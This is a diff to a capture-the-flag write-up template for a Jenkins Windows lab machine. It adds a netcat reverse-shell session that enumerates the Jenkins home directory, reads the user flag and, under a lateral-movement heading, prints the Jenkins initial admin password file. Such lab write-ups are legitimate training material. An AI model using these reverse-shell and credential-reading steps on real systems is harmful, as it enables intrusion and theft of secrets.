@@ -96,18 +96,110 @@ Description of the vulnerability exploited.
 
 ### Exploitation
 
-Step-by-step exploitation with commands.
-
-```shell
-# Commands used
-```
+img 1
 
 ---
 ## User Flag
 
+```
+nc -lvnp 9001                          
+listening on [any] 9001 ...
+connect to [10.10.15.80] from (UNKNOWN) [10.129.228.112] 49676
+Microsoft Windows [Version 10.0.10586]
+(c) 2015 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator\.jenkins>whoami 
+whoami
+jeeves\kohsuke
+
+C:\Users\Administrator\.jenkins>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 71A1-6FA1
+
+ Directory of C:\Users\Administrator\.jenkins
+
+09/14/2026  08:44 PM    <DIR>          .
+09/14/2026  08:44 PM    <DIR>          ..
+11/08/2017  05:45 PM                48 .owner
+09/14/2026  08:44 PM             1,684 config.xml
+09/14/2026  08:43 PM               156 hudson.model.UpdateCenter.xml
+11/03/2017  10:43 PM               374 hudson.plugins.git.GitTool.xml
+11/03/2017  10:33 PM             1,712 identity.key.enc
+11/03/2017  10:46 PM                94 jenkins.CLI.xml
+09/14/2026  08:46 PM            85,017 jenkins.err.log
+11/03/2017  10:47 PM           360,448 jenkins.exe
+11/03/2017  10:47 PM               331 jenkins.exe.config
+09/14/2026  08:44 PM                 4 jenkins.install.InstallUtil.lastExecVersion
+11/03/2017  10:45 PM                 4 jenkins.install.UpgradeWizard.state
+11/03/2017  10:46 PM               138 jenkins.model.DownloadSettings.xml
+10/25/2022  12:56 PM             3,024 jenkins.out.log
+09/14/2026  08:43 PM                 4 jenkins.pid
+11/03/2017  10:46 PM               169 jenkins.security.QueueItemAuthenticatorConfiguration.xml
+11/03/2017  10:46 PM               162 jenkins.security.UpdateSiteWarningsConfiguration.xml
+11/03/2017  10:47 PM        74,271,222 jenkins.war
+09/14/2026  08:43 PM            38,573 jenkins.wrapper.log
+11/03/2017  10:49 PM             2,881 jenkins.xml
+11/03/2017  10:33 PM    <DIR>          jobs
+11/03/2017  10:33 PM    <DIR>          logs
+09/14/2026  08:44 PM               907 nodeMonitors.xml
+11/03/2017  10:33 PM    <DIR>          nodes
+11/03/2017  10:44 PM    <DIR>          plugins
+11/03/2017  10:47 PM               129 queue.xml.bak
+11/03/2017  10:33 PM                64 secret.key
+11/03/2017  10:33 PM                 0 secret.key.not-so-secret
+12/24/2017  03:47 AM    <DIR>          secrets
+11/08/2017  09:52 AM    <DIR>          updates
+11/03/2017  10:33 PM    <DIR>          userContent
+11/03/2017  10:33 PM    <DIR>          users
+11/03/2017  10:47 PM    <DIR>          war
+11/03/2017  10:43 PM    <DIR>          workflow-libs
+              23 File(s)     74,767,145 bytes
+              12 Dir(s)   2,648,793,088 bytes free
+
+C:\Users\Administrator\.jenkins>dir c:\users
+dir c:\users
+ Volume in drive C has no label.
+ Volume Serial Number is 71A1-6FA1
+
+ Directory of c:\users
+
+11/08/2017  06:22 PM    <DIR>          .
+11/08/2017  06:22 PM    <DIR>          ..
+11/03/2017  11:07 PM    <DIR>          Administrator
+11/05/2017  10:17 PM    <DIR>          DefaultAppPool
+11/03/2017  11:19 PM    <DIR>          kohsuke
+10/25/2017  04:46 PM    <DIR>          Public
+               0 File(s)              0 bytes
+               6 Dir(s)   2,648,793,088 bytes free
+
+C:\Users\Administrator\.jenkins>dir c:\users\kohsuke\Desktop
+dir c:\users\kohsuke\Desktop
+ Volume in drive C has no label.
+ Volume Serial Number is 71A1-6FA1
+
+ Directory of c:\users\kohsuke\Desktop
+
+11/03/2017  11:19 PM    <DIR>          .
+11/03/2017  11:19 PM    <DIR>          ..
+11/03/2017  11:22 PM                32 user.txt
+               1 File(s)             32 bytes
+               2 Dir(s)   2,648,793,088 bytes free
+
+C:\Users\Administrator\.jenkins>type c:\users\kohsuke\Desktop\user.txt
+type c:\users\kohsuke\Desktop\user.txt
+e3232272596fb47950d59c4cf1e7066a
+
+```
+
 ### Lateral Movement (if applicable)
 
-Steps to move from initial foothold to user access.
+```
+C:\Users\Administrator\.jenkins\secrets>type initialAdminPassword
+type initialAdminPassword
+ccd3bc435b3c4f80bea8acca28aec491
+
+```
 
 
 ---
